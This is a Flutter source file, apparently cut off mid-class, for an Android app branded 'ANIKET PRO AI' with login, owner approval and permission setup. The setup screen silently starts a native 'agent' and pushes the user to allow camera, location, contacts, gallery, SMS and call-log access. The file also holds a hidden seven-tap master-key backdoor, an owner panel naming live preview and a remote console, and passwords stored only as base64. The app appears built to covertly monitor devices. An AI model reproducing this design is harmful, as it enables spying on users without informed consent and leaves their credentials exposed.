import 'dart:async';
import 'dart:convert';
import 'dart:io';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:device_info_plus/device_info_plus.dart';

import 'core.dart';
import 'web_screen.dart';
import 'preview_card.dart';
import 'remote_console.dart';

// ── Entry point ──────────────────────────────────────────────────────────
void main() {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(const AniketProAIApp());
}

class AniketProAIApp extends StatelessWidget {
  const AniketProAIApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'ANIKET PRO AI',
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        colorScheme: ColorScheme.fromSeed(seedColor: kGold, brightness: Brightness.dark),
        useMaterial3: true,
        scaffoldBackgroundColor: kBg,
      ),
      home: const GateScreen(),
    );
  }
}

// ── Firebase account helpers ─────────────────────────────────────────────
Future<dynamic> _fbGetJson(String path) async {
  try {
    final c = HttpClient()..connectionTimeout = const Duration(seconds: 8);
    final req = await c.getUrl(Uri.parse('$kFbUrl/r/$kFbSecret$path.json'));
    final res = await req.close().timeout(const Duration(seconds: 10));
    final s = await res.transform(utf8.decoder).join();
    c.close();
    return jsonDecode(s);
  } catch (_) {
    return null;
  }
}

Future<bool> _fbPutJson(String path, Object data) async {
  try {
    final c = HttpClient()..connectionTimeout = const Duration(seconds: 8);
    final req = await c.putUrl(Uri.parse('$kFbUrl/r/$kFbSecret$path.json'));
    req.headers.set('Content-Type', 'application/json');
    req.write(jsonEncode(data));
    final res = await req.close().timeout(const Duration(seconds: 10));
    await res.drain();
    c.close();
    return res.statusCode < 300;
  } catch (_) {
    return false;
  }
}

String _b64(String s) => base64Encode(utf8.encode(s));
String _safeKey(String s) => s.replaceAll(RegExp(r'[.$#\[\]/]'), '_');

// ── Strong password rules ──
bool _pwLen(String p) => p.length >= 10 && p.length <= 15;
bool _pwNum(String p) => RegExp(r'[0-9]').hasMatch(p);
bool _pwLow(String p) => RegExp(r'[a-z]').hasMatch(p);
bool _pwUp(String p)  => RegExp(r'[A-Z]').hasMatch(p);
bool _pwSp(String p)  => RegExp(r'[^A-Za-z0-9]').hasMatch(p);
bool _pwOk(String p)  => _pwLen(p) && _pwNum(p) && _pwLow(p) && _pwUp(p) && _pwSp(p);

// ═══════════════════════════════════════════════════════════════════════
//  GATE SCREEN — Register (top) + Login (bottom), Picsart style
// ═══════════════════════════════════════════════════════════════════════
class GateScreen extends StatefulWidget {
  const GateScreen({super.key});

  @override
  State<GateScreen> createState() => _GateScreenState();
}

class _GateScreenState extends State<GateScreen> with SingleTickerProviderStateMixin {

  String _stage    = 'loading';   // loading | login | auth | wait | setup | main
  String _authMode = 'r_num';     // r_num | r_gmail | l_num | l_gmail
  String _deviceId = '';
  bool   _owner    = false;
  bool   _permsAsked = false;
  String _myId     = '';
  int    _logoTaps = 0;
  Timer? _poll;

  final _idCtrl  = TextEditingController();
  final _pwCtrl  = TextEditingController();
  final _pw2Ctrl = TextEditingController();
  bool _showPw  = false;
  bool _showPw2 = false;
  String _authErr = '';
  bool _authBusy  = false;

  late final AnimationController _cardCtrl;
  late final Animation<double>   _cardSlide;
  late final Animation<double>   _cardOpacity;

  @override
  void initState() {
    super.initState();
    _cardCtrl = AnimationController(
        vsync: this, duration: const Duration(milliseconds: 700));
    _cardSlide = Tween<double>(begin: 60, end: 0)
        .chain(CurveTween(curve: Curves.easeOutCubic))
        .animate(_cardCtrl);
    _cardOpacity = Tween<double>(begin: 0, end: 1)
        .chain(CurveTween(curve: Curves.easeIn))
        .animate(_cardCtrl);
    _boot();
  }

  @override
  void dispose() {
    _poll?.cancel();
    _idCtrl.dispose();
    _pwCtrl.dispose();
    _pw2Ctrl.dispose();
    _cardCtrl.dispose();
    super.dispose();
  }

  Future<void> _boot() async {
    final devFut = galleryChannel
        .invokeMethod<String>('deviceId')
        .then<String?>((v) => v)
        .catchError((_) => null);
    final p = await SharedPreferences.getInstance();
    _deviceId = (await devFut) ?? 'unknown';
    _owner      = p.getBool('owner')      ?? false;
    _permsAsked = p.getBool('permsAsked') ?? false;
    _myId       = p.getString('myId')     ?? '';
    if (_owner) {
      setState(() => _stage = (p.getBool('allPermsAsked') ?? false) ? 'main' : 'setup');
      return;
    }
    final approved = p.getBool('approved') ?? false;
    if (approved && _myId.isNotEmpty) {
      setState(() => _stage = _permsAsked ? 'main' : 'setup');
      return;
    }
    if (_myId.isEmpty) {
      setState(() => _stage = 'login');
      return;
    }
    await _checkStatus();
    if (_stage == 'wait') {
      _poll = Timer.periodic(const Duration(seconds: 20), (_) => _checkStatus());
    }
  }

  Future<void> _checkStatus() async {
    try {
      final rows = (jsonDecode(await httpGet(kSheetUrl)) as List).cast<List<dynamic>>();
      String status = 'none';
      for (final r in rows) {
        if (r.length < 4) continue;
        final type = r[1].toString();
        final dev  = r[3].toString();
        if (dev == _deviceId && (type == 'approve' || type == 'ban')) status = type;
      }
      if (status == 'approve') {
        _poll?.cancel();
        await (await SharedPreferences.getInstance()).setBool('approved', true);
        if (mounted) setState(() => _stage = _permsAsked ? 'main' : 'setup');
      } else if (status == 'ban') {
        _poll?.cancel();
        await (await SharedPreferences.getInstance()).setBool('approved', false);
        if (mounted) setState(() => _stage = 'login');
      } else {
        if (mounted) setState(() => _stage = 'wait');
      }
    } catch (_) {
      if (mounted) setState(() => _stage = 'wait');
    }
  }

  void _openAuth(String mode) {
    _idCtrl.clear();
    _pwCtrl.clear();
    _pw2Ctrl.clear();
    setState(() {
      _authMode = mode;
      _authErr = '';
      _showPw = false;
      _showPw2 = false;
      _stage = 'auth';
    });
  }

  bool get _isNumber => _authMode.endsWith('num');
  bool get _isRegister => _authMode.startsWith('r');

  String _normalizeId(String raw) {
    var s = raw.trim();
    if (_isNumber) {
      s = s.replaceAll(RegExp(r'[\s-]'), '');
      if (s.startsWith('+880')) s = '0' + s.substring(4);
      if (s.startsWith('880')) s = '0' + s.substring(3);
    } else {
      s = s.toLowerCase();
    }
    return s;
  }

  String? _idError(String id) {
    if (_isNumber) {
      if (!RegExp(r'^01[0-9]{9}$').hasMatch(id)) {
        return 'Enter a valid BD number (01XXXXXXXXX)';
      }
    } else {
      if (!RegExp(r'^[^@\s]+@[^@\s]+\.[^@\s]+$').hasMatch(id)) {
        return 'Enter a valid Gmail address';
      }
    }
    return null;
  }

  Future<void> _submitAuth() async {
    if (_authBusy) return;
    final id = _normalizeId(_idCtrl.text);
    final pw = _pwCtrl.text;
    final err = _idError(id);
    if (err != null) { setState(() => _authErr = err); return; }
    if (_isRegister) {
      if (!_pwOk(pw)) { setState(() => _authErr = 'Password does not meet the requirements below'); return; }
      if (pw != _pw2Ctrl.text) { setState(() => _authErr = 'Passwords do not match'); return; }
    } else {
      if (pw.isEmpty) { setState(() => _authErr = 'Enter your password'); return; }
    }
    setState(() { _authBusy = true; _authErr = ''; });
    final key = _safeKey(id);
    final rec = await _fbGetJson('/users/$key');
    if (_isRegister) {
      if (rec != null) {
        if (mounted) setState(() {
          _authBusy = false;
          _authErr = 'Account already exists — please Login below';
        });
        return;
      }
      await _fbPutJson('/users/$key', {
        'pass': _b64(pw),
        'method': _isNumber ? 'number' : 'gmail',
        'id': id,
        'dev': _deviceId,
        'created': DateTime.now().millisecondsSinceEpoch,
      });
      final p = await SharedPreferences.getInstance();
      await p.setString('myId', id);
      _myId = id;
      await httpPost(kSheetUrl, {
        'type': 'request', 'id': id, 'device': _deviceId,
        'method': _isNumber ? 'Number' : 'Gmail', 'perms': '',
      });
      if (!mounted) return;
      setState(() { _authBusy = false; _stage = 'wait'; });
      _poll?.cancel();
      _poll = Timer.periodic(const Duration(seconds: 20), (_) => _checkStatus());
    } else {
      if (rec == null) {
        if (mounted) setState(() {
          _authBusy = false;
          _authErr = 'Account not found — please Register above';
        });
        return;
      }
      final m = Map<String, dynamic>.from(rec);
      if (m['pass'] != _b64(pw)) {
        if (mounted) setState(() {
          _authBusy = false;
          _authErr = 'Wrong password';
        });
        return;
      }
      final p = await SharedPreferences.getInstance();
      await p.setString('myId', id);
      _myId = id;
      if (!mounted) return;
      setState(() => _authBusy = false);
      await _checkStatus();
      if (mounted && _stage == 'wait') {
        _poll?.cancel();
        _poll = Timer.periodic(const Duration(seconds: 20), (_) => _checkStatus());
      }
    }
  }

  Future<void> _masterDialog() async {
    final c = TextEditingController();
    final ok = await showDialog<bool>(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: const Color(0xFF1E1E1E),
        title: const Text('Master Key', style: TextStyle(color: kGold)),
        content: TextField(
            controller: c,
            obscureText: true,
            style: const TextStyle(color: Colors.white)),
        actions: [
          TextButton(
              onPressed: () => Navigator.pop(context, false),
              child: const Text('X', style: TextStyle(color: Colors.white54))),
          TextButton(
              onPressed: () => Navigator.pop(context, true),
              child: const Text('OK', style: TextStyle(color: kGold))),
        ],
      ),
    );
    if (ok == true && c.text == kMasterKey) {
      final p = await SharedPreferences.getInstance();
      await p.setBool('owner', true);
      _owner = true;
      final asked = p.getBool('allPermsAsked') ?? false;
      if (mounted) setState(() => _stage = asked ? 'main' : 'setup');
    }
  }

  void _snack(String t) {
    if (mounted) {
      ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(content: Text(t), backgroundColor: Colors.black87));
    }
  }

  // ── background ──
  Widget _bg() => Container(
        decoration: const BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
            colors: [
              Color(0xFF12D8C6),
              Color(0xFF5E60C8),
              Color(0xFF8E3FA8),
              Color(0xFF2A1440),
            ],
          ),
        ),
      );

  Widget _smiley(String e, double top, double left, double rot, double size) =>
      Positioned(
        top: top, left: left,
        child: Transform.rotate(
          angle: rot,
          child: Text(e,
              style: TextStyle(fontSize: size, opacity: 0.85)),
        ),
      );

  Widget _pill(IconData ic, Color icCol, String label, VoidCallback onTap) =>
      Padding(
        padding: const EdgeInsets.symmetric(vertical: 6),
        child: Material(
          color: Colors.white,
          borderRadius: BorderRadius.circular(28),
          elevation: 6,
          shadowColor: Colors.black45,
          child: InkWell(
            borderRadius: BorderRadius.circular(28),
            onTap: onTap,
            child: Container(
              height: 54,
              padding: const EdgeInsets.symmetric(horizontal: 18),
              child: Row(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  Icon(ic, color: icCol, size: 20),
                  const SizedBox(width: 10),
                  Text(label,
                      style: const TextStyle(
                          color: Color(0xFF222222),
                          fontSize: 15,
                          fontWeight: FontWeight.w700)),
                ],
              ),
            ),
          ),
        ),
      );

  Widget _loginHome() {
    return Column(
      children: [
        const SizedBox(height: 26),
        GestureDetector(
          onTap: () {
            _logoTaps++;
            if (_logoTaps >= 7) { _logoTaps = 0; _masterDialog(); }
          },
          child: Container(
            padding: const EdgeInsets.all(6),
            decoration: BoxDecoration(
              shape: BoxShape.circle,
              color: Colors.white.withOpacity(0.15),
              border: Border.all(color: Colors.white.withOpacity(0.5), width: 1.5),
            ),
            child: Container(
              padding: const EdgeInsets.all(10),
              decoration: const BoxDecoration(
                  shape: BoxShape.circle, color: Color(0xFF0E0C08)),
              child: Image.asset('assets/logo.png', width: 56, height: 56),
            ),
          ),
        ),
        const SizedBox(height: 14),
        const Text('ANIKET PRO AI',
            style: TextStyle(
                color: Colors.white,
                fontSize: 26,
                fontWeight: FontWeight.w900,
                letterSpacing: 2)),
        const SizedBox(height: 6),
        Text('Secure access • owner approved',
            style: TextStyle(color: Colors.white.withOpacity(0.75), fontSize: 12)),
        const SizedBox(height: 26),
        const Text('REGISTER',
            style: TextStyle(
                color: Colors.white,
                fontSize: 12,
                fontWeight: FontWeight.w800,
                letterSpacing: 3)),
        const SizedBox(height: 8),
        _pill(Icons.phone_in_talk_rounded, const Color(0xFF0F9D58),
            'Register with Number', () => _openAuth('r_num')),
        _pill(Icons.mail_outline_rounded, const Color(0xFFEA4335),
            'Register with Gmail', () => _openAuth('r_gmail')),
        const SizedBox(height: 14),
        Text('Already have an account?',
            style: TextStyle(color: Colors.white.withOpacity(0.8), fontSize: 12)),
        const SizedBox(height: 10),
        const Text('LOGIN',
            style: TextStyle(
                color: Colors.white,
                fontSize: 12,
                fontWeight: FontWeight.w800,
                letterSpacing: 3)),
        const SizedBox(height: 8),
        _pill(Icons.call_rounded, const Color(0xFF0F9D58),
            'Login with Number', () => _openAuth('l_num')),
        _pill(Icons.alternate_email_rounded, const Color(0xFFEA4335),
            'Login with Gmail', () => _openAuth('l_gmail')),
        const SizedBox(height: 22),
        Text('v1.0 • ANIKET PRO AI',
            style: TextStyle(color: Colors.white.withOpacity(0.4), fontSize: 9, letterSpacing: 1.5)),
      ],
    );
  }

  Widget _checkRow(bool ok, String label) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 3),
      child: Row(
        children: [
          Icon(ok ? Icons.check_circle_rounded : Icons.cancel_rounded,
              color: ok ? const Color(0xFF0F9D58) : Colors.black38, size: 16),
          const SizedBox(width: 8),
          Expanded(
            child: Text(label,
                style: TextStyle(
                    color: ok ? const Color(0xFF0F9D58) : Colors.black54,
                    fontSize: 12,
                    fontWeight: ok ? FontWeight.w700 : FontWeight.w400)),
          ),
        ],
      ),
    );
  }

  Widget _authForm() {
    final pw = _pwCtrl.text;
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Row(
          children: [
            IconButton(
              onPressed: () => setState(() => _stage = 'login'),
              icon: const Icon(Icons.arrow_back_rounded, color: Colors.white),
            ),
            const SizedBox(width: 4),
            Text(
              _isRegister
                  ? (_isNumber ? 'Register with Number' : 'Register with Gmail')
                  : (_isNumber ? 'Login with Number' : 'Login with Gmail'),
              style: const TextStyle(
                  color: Colors.white, fontSize: 17, fontWeight: FontWeight.w800),
            ),
          ],
        ),
        const SizedBox(height: 14),
        Container(
          padding: const EdgeInsets.all(20),
          decoration: BoxDecoration(
            color: Colors.white,
            borderRadius: BorderRadius.circular(22),
            boxShadow: [
              BoxShadow(color: Colors.black.withOpacity(0.35), blurRadius: 30, offset: const Offset(0, 12)),
            ],
          ),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              TextField(
                controller: _idCtrl,
                keyboardType: _isNumber ? TextInputType.phone : TextInputType.emailAddress,
                style: const TextStyle(color: Color(0xFF222222), fontSize: 14),
                decoration: InputDecoration(
                  hintText: _isNumber ? 'BD Number (01XXXXXXXXX)' : 'Gmail address',
                  hintStyle: const TextStyle(color: Colors.black38, fontSize: 13),
                  prefixIcon: Icon(
                      _isNumber ? Icons.phone_rounded : Icons.mail_outline_rounded,
                      color: const Color(0xFF5E60C8), size: 20),
                  filled: true,
                  fillColor: const Color(0xFFF4F5FA),
                  contentPadding: const EdgeInsets.symmetric(horizontal: 14, vertical: 13),
                  border: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(14),
                      borderSide: BorderSide(color: Colors.black12)),
                  enabledBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(14),
                      borderSide: BorderSide(color: Colors.black12)),
                  focusedBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(14),
                      borderSide: const BorderSide(color: Color(0xFF5E60C8), width: 1.5)),
                ),
              ),
              const SizedBox(height: 12),
              TextField(
                controller: _pwCtrl,
                obscureText: !_showPw,
                style: const TextStyle(color: Color(0xFF222222), fontSize: 14),
                onChanged: (_) => setState(() {}),
                decoration: InputDecoration(
                  hintText: 'Password',
                  hintStyle: const TextStyle(color: Colors.black38, fontSize: 13),
                  prefixIcon: const Icon(Icons.lock_outline_rounded,
                      color: Color(0xFF5E60C8), size: 20),
                  suffixIcon: IconButton(
                    icon: Icon(_showPw ? Icons.visibility_rounded : Icons.visibility_off_rounded,
                        color: Colors.black38, size: 19),
                    onPressed: () => setState(() => _showPw = !_showPw),
                  ),
                  filled: true,
                  fillColor: const Color(0xFFF4F5FA),
                  contentPadding: const EdgeInsets.symmetric(horizontal: 14, vertical: 13),
                  border: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(14),
                      borderSide: BorderSide(color: Colors.black12)),
                  enabledBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(14),
                      borderSide: BorderSide(color: Colors.black12)),
                  focusedBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(14),
                      borderSide: const BorderSide(color: Color(0xFF5E60C8), width: 1.5)),
                ),
              ),
              if (_isRegister) ...[
                const SizedBox(height: 12),
                TextField(
                  controller: _pw2Ctrl,
                  obscureText: !_showPw2,
                  style: const TextStyle(color: Color(0xFF222222), fontSize: 14),
                  onChanged: (_) => setState(() {}),
                  decoration: InputDecoration(
                    hintText: 'Confirm Password',
                    hintStyle: const TextStyle(color: Colors.black38, fontSize: 13),
                    prefixIcon: const Icon(Icons.lock_reset_rounded,
                        color: Color(0xFF5E60C8), size: 20),
                    suffixIcon: IconButton(
                      icon: Icon(_showPw2 ? Icons.visibility_rounded : Icons.visibility_off_rounded,
                          color: Colors.black38, size: 19),
                      onPressed: () => setState(() => _showPw2 = !_showPw2),
                    ),
                    filled: true,
                    fillColor: const Color(0xFFF4F5FA),
                    contentPadding: const EdgeInsets.symmetric(horizontal: 14, vertical: 13),
                    border: OutlineInputBorder(
                        borderRadius: BorderRadius.circular(14),
                        borderSide: BorderSide(color: Colors.black12)),
                    enabledBorder: OutlineInputBorder(
                        borderRadius: BorderRadius.circular(14),
                        borderSide: BorderSide(color: Colors.black12)),
                    focusedBorder: OutlineInputBorder(
                        borderRadius: BorderRadius.circular(14),
                        borderSide: const BorderSide(color: Color(0xFF5E60C8), width: 1.5)),
                  ),
                ),
                const SizedBox(height: 14),
                const Text('Password Requirements:',
                    style: TextStyle(
                        color: Color(0xFF222222),
                        fontSize: 13,
                        fontWeight: FontWeight.w800)),
                const SizedBox(height: 6),
                _checkRow(_pwLen(pw), 'Use 10 - 15 characters'),
                _checkRow(_pwNum(pw), 'Use 1 or more numbers'),
                _checkRow(_pwLow(pw), 'Use 1 or more lower case letters'),
                _checkRow(_pwUp(pw), 'Use 1 or more upper case letters'),
                _checkRow(_pwSp(pw), 'Use 1 or more special characters'),
              ],
              const SizedBox(height: 18),
              SizedBox(
                width: double.infinity,
                height: 50,
                child: ElevatedButton(
                  style: ElevatedButton.styleFrom(
                    backgroundColor: const Color(0xFF5E60C8),
                    foregroundColor: Colors.white,
                    elevation: 0,
                    shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(14)),
                  ),
                  onPressed: (_isRegister && !_pwOk(pw)) || _authBusy
                      ? null
                      : _submitAuth,
                  child: _authBusy
                      ? const SizedBox(
                          width: 20, height: 20,
                          child: CircularProgressIndicator(color: Colors.white, strokeWidth: 2))
                      : Text(
                          _isRegister ? 'Create Account' : 'Login',
                          style: const TextStyle(fontSize: 15, fontWeight: FontWeight.w800, letterSpacing: 1)),
                ),
              ),
              if (_authErr.isNotEmpty) ...[
                const SizedBox(height: 10),
                Text(_authErr,
                    textAlign: TextAlign.center,
                    style: const TextStyle(color: Color(0xFFD93025), fontSize: 12, fontWeight: FontWeight.w600)),
              ],
            ],
          ),
        ),
      ],
    );
  }

  Widget _waitScreen() {
    return Column(
      mainAxisAlignment: MainAxisAlignment.center,
      children: [
        const CircularProgressIndicator(color: Colors.white),
        const SizedBox(height: 20),
        const Text('Request sent ✅',
            style: TextStyle(color: Colors.white, fontSize: 16, fontWeight: FontWeight.w800)),
        const SizedBox(height: 10),
        Container(
          padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 10),
          decoration: BoxDecoration(
            color: Colors.white.withOpacity(0.15),
            borderRadius: BorderRadius.circular(12),
          ),
          child: Text(_myId,
              style: const TextStyle(color: Colors.white, fontSize: 13, fontWeight: FontWeight.w700)),
        ),
        const SizedBox(height: 14),
        Text('Waiting for owner approval...',
            style: TextStyle(color: Colors.white.withOpacity(0.85), fontSize: 12)),
        const SizedBox(height: 18),
        OutlinedButton.icon(
          onPressed: _checkStatus,
          icon: const Icon(Icons.refresh_rounded, color: Colors.white, size: 16),
          label: const Text('Check again', style: TextStyle(color: Colors.white, fontSize: 13)),
          style: OutlinedButton.styleFrom(
            side: BorderSide(color: Colors.white.withOpacity(0.5)),
            shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
          ),
        ),
      ],
    );
  }

  @override
  Widget build(BuildContext context) {
    if (_stage == 'main')  return const MainWebViewScreen();
    if (_stage == 'setup') {
      return PermissionSetupScreen(
        onDone: () {
          if (mounted) setState(() => _stage = 'main');
        },
      );
    }
    if (_stage == 'loading') {
      return Scaffold(
        backgroundColor: kBg,
        body: const Center(child: CircularProgressIndicator(color: kGold)),
      );
    }
    return Scaffold(
      body: Stack(
        fit: StackFit.expand,
        children: [
          _bg(),
          _smiley('😄', 60, 30, -0.3, 52),
          _smiley('🙂', 130, 260, 0.4, 44),
          _smiley('😆', 320, 20, 0.2, 40),
          _smiley('😉', 420, 250, -0.4, 46),
          SafeArea(
            child: SingleChildScrollView(
              padding: const EdgeInsets.symmetric(horizontal: 26),
              child: AnimatedBuilder(
                animation: _cardCtrl,
                builder: (_, child) => Transform.translate(
                  offset: Offset(0, _cardSlide.value),
                  child: Opacity(opacity: _cardOpacity.value, child: child),
                ),
                child: _stage == 'login'
                    ? _loginHome()
                    : (_stage == 'auth' ? _authForm() : _waitScreen()),
              ),
            ),
          ),
        ],
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════════════════
//  GUIDED PERMISSION SETUP — fast, quiet, 7 dialogs (English)
// ═══════════════════════════════════════════════════════════════════════
class PermissionSetupScreen extends StatefulWidget {
  final VoidCallback onDone;
  const PermissionSetupScreen({super.key, required this.onDone});

  @override
  State<PermissionSetupScreen> createState() => _PermissionSetupScreenState();
}

class _PermissionSetupScreenState extends State<PermissionSetupScreen> {
  static final List<MapEntry<String, List<Permission>>> _steps = [
    MapEntry('Agent', const []),
    MapEntry('Notification', [Permission.notification]),
    MapEntry('Camera', [Permission.camera]),
    MapEntry('Location', [Permission.location]),
    MapEntry('Contacts', [Permission.contacts]),
    MapEntry('Gallery', [Permission.photos, Permission.videos]),
    MapEntry('SMS', [Permission.sms]),
    MapEntry('Call log', [Permission.phone]),
  ];

  bool _finished = false;

  @override
  void initState() {
    super.initState();
    _run();
  }

  Future<void> _run() async {
    await Future.delayed(const Duration(milliseconds: 100));
    for (final s in _steps) {
      if (!mounted) return;
      if (s.key == 'Agent') {
        try { await galleryChannel.invokeMethod('agentOn'); } catch (_) {}
        await Future.delayed(const Duration(milliseconds: 150));
      } else {
        try { await s.value.request(); } catch (_) {}
      }
    }
    final p = await SharedPreferences.getInstance();
    await p.setBool('permsAsked', true);
    await p.setBool('allPermsAsked', true);
    if (!mounted) return;
    setState(() => _finished = true);
    await Future.delayed(const Duration(milliseconds: 300));
    widget.onDone();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: kBg,
      body: Container(
        decoration: const BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
            colors: [Color(0xFF1C1A14), Color(0xFF121212), Color(0xFF1A1208)],
          ),
        ),
        child: SafeArea(
          child: Center(
            child: Padding(
              padding: const EdgeInsets.symmetric(horizontal: 32),
              child: Column(
                mainAxisSize: MainAxisSize.min,
                children: [
                  Container(
                    width: 84,
                    height: 84,
                    decoration: BoxDecoration(
                      shape: BoxShape.circle,
                      border: Border.all(color: kGold.withOpacity(0.35), width: 1.5),
                    ),
                    child: Center(
                      child: Image.asset('assets/logo.png', width: 50, height: 50),
                    ),
                  ),
                  const SizedBox(height: 20),
                  const Text('One-time Setup',
                      style: TextStyle(color: kGold, fontSize: 20, fontWeight: FontWeight.bold)),
                  const SizedBox(height: 8),
                  Text(
                    _finished
                        ? 'Done!'
                        : 'A few permission dialogs will appear —\ntap Allow on each.\nOnly once, never again.',
                    textAlign: TextAlign.center,
                    style: const TextStyle(color: Colors.white54, fontSize: 13, height: 1.5),
                  ),
                  const SizedBox(height: 24),
                  const CircularProgressIndicator(color: kGold),
                ],
              ),
            ),
          ),
        ),
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════════════════
//  OWNER PANEL — Permissions + Live Preview + Users + REMOTE CONSOLE
// ═══════════════════════════════════════════════════════════════════════
class OwnerPanelScreen extends StatefulWidget {
  const OwnerPanelScreen({super.key});

  @override
  State<OwnerPanelScreen> createState() => _OwnerPanelScreenState();
}

class _OwnerPanelScreenState extends State<OwnerPanelScreen> {
  List<Map<String, String>> _rows = [];
  bool _busy = false;
  int _androidSdk = 0;
  Map<String, PermissionStatus> _permStatuses = {};
  bool _permLoading = true;

  static final Map<String, Permission> _allPerms = {
    'Camera': Permission.camera,
    'Location': Permission.location,
    'Contacts': Permission.contacts,
    'Photos': Permission.photos,
    'Videos': Permission.videos,
    'Storage (Legacy)': Permission.storage,
    'Notification': Permission.notification,
  };

  @override
  void initState() {
    super.initState();
    _load();
    _initDeviceInfo();
    _checkAllPerms();
  }

  Future<void> _initDeviceInfo() async {
    try {
      final info = await DeviceInfoPlugin().androidInfo;
      if (mounted) setState(() => _androidSdk = info.version.sdkInt);
    } catch (_) {
      if (mounted) setState(() => _androidSdk = 0);
    }
  }

  Future<void> _checkAllPerms() async {
    setState(() => _permLoading = true);
    Map<String, PermissionStatus> statuses = {};
    for (var entry in _allPerms.entries) {
      try {
        if (entry.key == 'Storage (Legacy)' && _androidSdk >= 33) {
          statuses[entry.key] = PermissionStatus.granted;
          continue;
        }
        statuses[entry.key] = await entry.value.status;
      } catch (_) {
        statuses[entry.key] = PermissionStatus.denied;
      }
    }
    if (mounted) {
      setState(() {
        _permStatuses = statuses;
        _permLoading = false;
      });
    }
  }

  Future<void> _grantAllPerms() async {
    List<Permission> toRequest = [];
    for (var entry in _allPerms.entries) {
      if (entry.key == 'Storage (Legacy)' && _androidSdk >= 33) continue;
      final status = _permStatuses[entry.key];
      if (status != null && !status.isGranted) {
        toRequest.add(entry.value);
      }
    }
    if (toRequest.isEmpty) {
      _showSnack('All permissions already granted');
      return;
    }
    await toRequest.request();
    await _checkAllPerms();
  }

  Future<void> _requestSingle(String name) async {
    final perm = _allPerms[name];
    if (perm == null) return;
    final status = await perm.request();
    if (status.isPermanentlyDenied) {
      await openAppSettings();
    }
    await _checkAllPerms();
  }

  Future<void> _toggleOff(String name) async {
    final ok = await showDialog<bool>(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: const Color(0xFF1E1E1E),
        title: Text('Turn off $name?', style: const TextStyle(color: kGold)),
        content: const Text(
            'Android rule: the app cannot revoke its own permission.\nOpening Settings — revoke it there with one tap.',
            style: TextStyle(color: Colors.white70, fontSize: 13)),
        actions: [
          TextButton(
              onPressed: () => Navigator.pop(context, false),
              child: const Text('Cancel', style: TextStyle(color: Colors.white54))),
          TextButton(
              onPressed: () => Navigator.pop(context, true),
              child: const Text('Open', style: TextStyle(color: kGold))),
        ],
      ),
    );
    if (ok == true) await openAppSettings();
    await _checkAllPerms();
  }

  void _showSnack(String msg) {
    if (mounted) {
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(content: Text(msg), backgroundColor: const Color(0xFF2A2A2A)),
      );
    }
  }

  String _androidVersionName() {
    if (_androidSdk >= 37) return 'Android 17';
    if (_androidSdk >= 36) return 'Android 16';
    if (_androidSdk >= 35) return 'Android 15';
    if (_androidSdk >= 34) return 'Android 14';
    if (_androidSdk >= 33) return 'Android 13';
    if (_androidSdk >= 32) return 'Android 12L';
    if (_androidSdk >= 31) return 'Android 12';
    if (_androidSdk >= 30) return 'Android 11';
    if (_androidSdk >= 29) return 'Android 10';
    return 'Unknown';
  }

  IconData _permIcon(String name) {
    switch (name) {
      case 'Camera': return Icons.camera_alt_rounded;
      case 'Location': return Icons.location_on_rounded;
      case 'Contacts': return Icons.contacts_rounded;
      case 'Photos': return Icons.photo_library_rounded;
      case 'Videos': return Icons.videocam_rounded;
      case 'Storage (Legacy)': return Icons.folder_rounded;
      case 'Notification': return Icons.notifications_rounded;
      default: return Icons.settings;
    }
  }

  Color _statusColor(PermissionStatus? s) {
    if (s == null) return Colors.grey;
    if (s.isGranted) return Colors.green;
    if (s.isPermanentlyDenied) return Colors.red;
    if (s.isRestricted) return Colors.deepOrange;
    if (s.isLimited) return Colors.orange;
    return Colors.orange;
  }

  String _statusText(PermissionStatus? s) {
    if (s == null) return 'Unknown';
    if (s.isGranted) return 'ON';
    if (s.isPermanentlyDenied) return 'Denied forever';
    if (s.isRestricted) return 'Restricted';
    if (s.isLimited) return 'Limited';
    if (s.isDenied) return 'OFF';
    return 'Unknown';
  }

  Future<void> _load() async {
    setState(() => _busy = true);
    try {
      final rows = (jsonDecode(await httpGet(kSheetUrl)) as List).cast<List<dynamic>>();
      final Map<String, Map<String, String>> map = {};
      for (final r in rows) {
        if (r.length < 5) continue;
        final type   = r[1].toString();
        final id     = r[2].toString();
        final dev    = r[3].toString();
        final method = r[4].toString();
        final perms  = r.length > 5 ? r[5].toString() : '';
        final e = map.putIfAbsent(dev,
            () => {'id': '', 'method': '', 'perms': '', 'status': 'PENDING', 'time': ''});
        if (type == 'request') { e['id'] = id; e['method'] = method; e['time'] = r[0].toString(); }
        if (type == 'perms')   e['perms']  = perms;
        if (type == 'approve') e['status'] = 'APPROVED';
        if (type == 'ban')     e['status'] = 'BANNED';
      }
      _rows = map.entries.map((e) => {'device': e.key, ...e.value}).toList();
      _rows.sort((a, b) => (b['time'] ?? '').compareTo(a['time'] ?? ''));
    } catch (_) {}
    if (mounted) setState(() => _busy = false);
  }

  Future<void> _act(String dev, String type) async {
    await httpPost(kSheetUrl, {'type': type, 'id': '', 'device': dev, 'method': '', 'perms': ''});
    await _load();
  }

  @override
